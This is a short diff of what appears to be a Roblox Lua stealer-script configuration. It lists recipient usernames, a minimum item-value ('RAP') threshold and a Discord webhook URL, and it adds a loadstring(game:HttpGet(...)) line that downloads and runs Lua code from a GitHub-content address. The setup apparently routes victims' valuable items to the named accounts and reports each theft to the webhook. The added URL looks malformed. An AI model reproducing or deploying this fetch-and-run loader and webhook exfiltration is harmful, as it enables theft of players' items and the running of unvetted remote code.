@@ -3,4 +3,4 @@ Username2 = "SkibidiAhhWolf9"
 MinimumRAP = 100000
 Webhook = "https://discord.com/api/webhooks/1363402298298208276/Fd7Dp3mcxrLtWMS2lL4DC2wpJwBJcKO8gf1zKqutTMjtA4-EwIBB1D9uZCnXPlRO7sjm"
 
-loadstring(game:HttpGet(""))()
+loadstring(game:HttpGet("https://githubusercontent.com/SkibidiAhhWolf9/scriptercase/refs/heads/main/Whatever20%you20%want20%here"))()
